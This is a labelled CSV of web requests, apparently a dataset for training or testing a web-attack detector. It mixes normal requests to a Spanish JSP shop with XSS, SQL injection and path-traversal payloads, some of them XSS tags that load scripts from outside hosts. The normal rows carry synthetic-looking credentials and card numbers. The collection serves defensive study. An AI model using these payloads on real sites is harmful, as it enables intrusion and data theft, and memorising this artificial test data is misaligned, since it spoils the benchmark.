imagenes/3.gif,normal,0.140517108
index.jsp,normal,0.070365066
imagenes/nuestratierra.jpg,normal,0.378050468
global/estilos.css,normal,0.414940273
publico/registro.jsp?modo=registro&login=chunshin&password=GrajA&nombre=Jan&apellidos=Sp%EDnola+Ballado&email=bannerman%40nevadahispanica.aq&dni=40979614P&direccion=Ferrer+Del+Rio%2C+126+2%3FH&ciudad=Corull%F3n&cp=32170&provincia=Cantabria&ntc=8975421069079015&B1=Registrar,normal,0.861739582
imagenes/logo.gif,normal,0.093430573
imagenes/logo.gif,normal,0.113969875
"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",xss,0.409045269
miembros/imagenes/ogono.jpg,normal,0.443975325
imagenes/2.gif,normal,0.765780716
imagenes/2.gif,normal,0.108808599
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.284162993
miembros/salir.jsp,normal,0.870917964
"&onUE: select * from users where id=1 or \<$ union select 1,@@VERSION -- 1",sqli,0.990064854
global/menum.jsp,normal,0.378290524
miembros/salir.jsp,normal,0.282233655
"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss,0.658566056
"""`'><script>\xC2\x85javascript:alert(1)</script>",xss,0.295050026
<img SRC='vbscript:document.vulnerable=true;'>,xss,0.079497351
miembros/fotos.jsp,normal,0.83733051
publico/autenticar.jsp?modo=entrar&login=jasmann&pwd=Co4si35a&remember=on&B1=Entrar,normal,0.979389863
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal,0.004263291
publico/miembros.jsp,normal,0.691774882
<img src=xss onerror=alert(1)>,xss,0.747874883
<input onfocus=write(XSS) autofocus>,xss,0.87216164
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>,xss,0.13088108
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.946308769
"exp/*&lt;A STYLE='no\xss&#58;noxss(\""*//*\"");",xss,0.966346316
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss,0.39780471
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.749100632
...\{FILE},traversal,0.90674365
"1UE1k: select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1",sqli,0.506857435
miembros/fotos.jsp,normal,0.110377113
imagenes/2.gif,normal,0.96911934
publico/productos.jsp,normal,0.758833532
miembros/fotos.jsp,normal,0.903462437
miembros/editar.jsp?modo=registro&login=ellswort&password=randera&nombre=Kamil&apellidos=Borb%F3n+Bascomta&email=karpf-valardy%40animextremist.lc&dni=36101090Z&direccion=Calle+Santa+Pola%2C+7+&ciudad=Iglesuela+del+Cid%2C+La&cp=20159&provincia=Huesca&ntc=3661940651728423&B1=Registrar,normal,0.654592056
.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\{FILE},traversal,0.374472258
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE},traversal,0.414407141
imagenes/3.gif,normal,0.286665738
"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",xss,0.753246589
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.278967898
publico/productos.jsp,normal,0.515890723
"o1UE1: select * from users where id=1 *1 union select 1,banner from v$version where rownum=1 -- 1",sqli,0.915568399
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal,0.846887949
publico/productos.jsp,normal,0.1137968
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss,0.808514957
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal,0.435632357
global/creditos.jsp,normal,0.157104175
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,xss,0.15952307
global/titulo.jsp,normal,0.392523345
"<;SCRIPT/XSS SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss,0.04994933
"<img src\x00=x onerror=""javascript:alert(1)"">",xss,0.05787181
global/creditos.jsp,normal,0.988537
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal,0.778419257
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.440903838
imagenes/logo.gif,normal,0.825309498
"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",xss,0.206837019
miembros/index.jsp,normal,0.653727815
"<IMG SRC=""jav&#x0D;ascript:alert(<WBR>'XSS');"">",xss,0.136457065
global/creditos.jsp,normal,0.765423416
<script>document.vulnerable=true;</script>,xss,0.086920971
global/estilos.css,normal,0.679498062
"sUE\c: select * from users where id='1' union select \#,@@VERSION -- 1'",sqli,0.801371354
"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",xss,0.372088634
miembros/imagenes/castro.jpg,normal,0.29379245
imagenes/3.gif,normal,0.755766596
global/estilos.css,normal,0.2591428
miembros/editar.jsp?modo=registro&login=joudrey&password=barcote&nombre=Clovis&apellidos=Vilca+Llora&email=ilijev%40mauroman.tc&dni=64575959D&direccion=El+Provencio%2C+6+8F&ciudad=Montell%E0+i+Martinet&cp=05240&provincia=Cuenca&ntc=7647479172246248&B1=Registrar,normal,0.075359523
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,xss,0.284809983
"n1UEv: select * from users where id=1 +$ 1 union select null,@@VERSION -- 1",sqli,0.544398707
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal,0.45985986
publico/caracteristicas.jsp?id=2,normal,0.109863766
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.264561962
miembros/imagenes/ogono.jpg,normal,0.771492599
"<;SCRIPT SRC="";http://ha.ckers.org/xss.jpg"";>;<;/SCRIPT>;",xss,0.68785331
"UE1n,: select * from users where id=1 union select .1_,version() -- 1",sqli,0.52522364
publico/registro.jsp?modo=registro&login=torcac2&password=pir%F3scafo&nombre=Agostina&apellidos=Camino+De+Mendonca&email=komarov%40docerosas.dk&dni=92106863M&direccion=Calle+Radio%2C+89+10F&ciudad=Torreblascopedro&cp=31153&provincia=Asturias&ntc=6202334892240470&B1=Registrar,normal,0.332957605
miembros/fotos.jsp,normal,0.418505303
"<div style=""font-family:foo}color=red;"">XXX",xss,0.285258037
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",xss,0.196571392
global/estilos.css,normal,0.197303621
"<IMG SRC=x onmouseup=""alert(String.fromCharCode(88,83,83))"">",xss,0.886447468
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.454370488
"o1UEv: select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1",sqli,0.165241933
<h1><font color=blue>hellox worldss</h1>,xss,0.002628311
imagenes/1.gif,normal,0.494264755
"<img\x11src=x onerror=""javascript:alert(1)"">",xss,0.582588506
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss,0.307860025
publico/carrito.jsp,normal,0.986574908
global/estilos.css,normal,0.936809856
"<img \x34src=x onerror=""javascript:alert(1)"">",xss,0.351788167
"<img src=""javascript:alert(1)"">",xss,0.406197754
miembros/imagenes/zarauz.jpg,normal,0.813637445
?,sqli,0.826171612
..//{FILE},traversal,0.978155126
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss,0.82647325
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.994968205
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=14&B1=A%F1adir+al+carrito,normal,0.888679611
imagenes/1.gif,normal,0.459244899
global/creditos.jsp,normal,0.475529326
global/menum.jsp,normal,0.763178266
..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE},traversal,0.721391457
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss,0.613047401
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.685371449
tz_offset,sqli,0.54377919
"<;DIV STYLE="";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029"";>;",xss,0.950901552
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},traversal,0.8146599
&lt;,xss,0.84554003
imagenes/cmenbul.gif,normal,0.390558227
miembros/imagenes/ogono.jpg,normal,0.321661429
"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss,0.991490306
publico/pagar.jsp?modo=insertar&precio=9740&B1=Confirmar,normal,0.708057585
1oo1&: select * from users where id=1 + \+%1 or 1=1 -- 1,sqli,0.870537331
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=32&B1=A%F1adir+al+carrito,normal,0.922021652
miembros/index.jsp,normal,0.685145716
publico/pagar.jsp?modo=insertar&precio=7003&B1=Confirmar,normal,0.026724046
publico/registro.jsp?modo=registro&login=gretal3&password=carbunclo&nombre=Cruz&apellidos=Chilel&email=braschi_courtneidge%40djbroadcast.an&dni=00660335M&direccion=Carretera+Industrial+149%2C+&ciudad=Sojuela&cp=04869&provincia=Navarra&ntc=4431931876895268&B1=Registrar,normal,0.969658137
imagenes/3.gif,normal,0.55467933
